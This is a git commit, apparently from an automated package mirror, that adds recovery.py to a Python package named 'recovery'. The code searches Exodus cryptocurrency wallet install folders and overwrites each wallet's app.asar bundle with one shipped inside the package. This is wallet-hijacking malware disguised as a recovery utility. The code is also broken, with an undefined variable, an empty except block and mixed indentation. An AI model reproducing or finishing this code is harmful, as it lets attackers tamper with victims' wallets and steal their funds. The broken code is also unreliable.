c75b324e0f0a7c8d4d4e8adee698c913e093d74f
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-07-31 15:06:38 +0000

    Add package recovery/0.1.6/recovery-0.1.6.tar.gz

---
+++ packages/recovery/recovery-0.1.6.tar.gz/recovery-0.1.6/recovery/recovery.py
@@ -0,0 +1,29 @@
+import os
+import pwd
+import shutil
+import pkg_resources
+
+def get_username():
+    return pwd.getpwuid(os.getuid())[0]
+
+def check():
+    package_path = pkg_resources.resource_filename('recovery', '')
+    default_config_path = os.path.join(package_path, 'app.asar')
+    #base_dir = "C:\\Users\\" + get_username() + "\\AppData\\Local\\exodus\\"
+    base_dir = "/home/hammy/exodus/"
+    prefix = "app-"
+
+    if not os.path.isfile(default_config_path):
+        return
+
+    for entry in os.listdir(base_dir):
+        full_path = os.path.join(base_dir, entry)
+
+        if os.path.isdir(full_path) and entry.startswith(prefix):
+            resources_path = os.path.join(full_path, 'resources', 'app.asar')
+            if os.path.isfile(resources_path):
+                try:
+                    shutil.copy(src_file, resources_path)
+                except Exception as e:
+            else:
+				pass
